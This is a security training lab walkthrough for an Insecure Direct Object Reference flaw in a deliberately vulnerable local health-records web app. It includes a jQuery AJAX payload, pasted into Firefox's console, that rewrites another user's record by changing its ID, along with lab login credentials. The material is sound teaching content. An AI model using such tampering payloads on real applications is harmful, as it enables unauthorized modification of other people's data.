## Insecure Direct Object Reference - AJAX
### Pre-Processing
* Open up terminal and run: `start_wecare.sh`
* Wait for a few seconds and open Firefox

### Lab
* Navigate to the we care vulnerable web application by browsing the URL `http://localhost:9000` from a web browser. The web browser shortcut could be found on the desktop.
* Login to the application as Betty Ross with the following credentials:
* Email: betty.ross@we45.com
* Password: secdevops
* Traverse to the following URL
* `http://localhost:9000/record/add/`
* Open the Web Console by hitting Ctrl+Shift+K
* Firefox doesn't allow pasting to the console by default. So you need to type `allow pasting` without pressing a Return/Enter at the end
* Copy the following code and paste it in the web console

```
function update(jsn)
 {
    $.ajax({
      type: "POST",
      url: '/update/record/',
      data: {
       rid: jsn,
       remarks : 'Injected by Betty ;)',
       csrfmiddlewaretoken: document.getElementsByName('csrfmiddlewaretoken')[0].value,
           },
     success: function(data) {
           alert(data);
          },
     error: function(xhr, textStatus, errorThrown) {
            alert("something went wrong");
            // alert(errorThrown)
          }
      });

 }

```
* Type `update(3);`
* Run the command by hitting Enter/return
* Upon running the payload web browser displays an alert Successfully updated test's Health Record
* Close the web console window
* Logout of the application
* Login to the application with the following credentials
* email: **steve.jobs@we45.com**
* password: **secdevops**
* Click on Health Record from the navigation panel on the left hand side
* Now click on Health Records from the drop down list and observe the remarks column. The remarks would be the string "Injected by Betty ;)".

### Stop App
* Run `stop_all_containers.sh`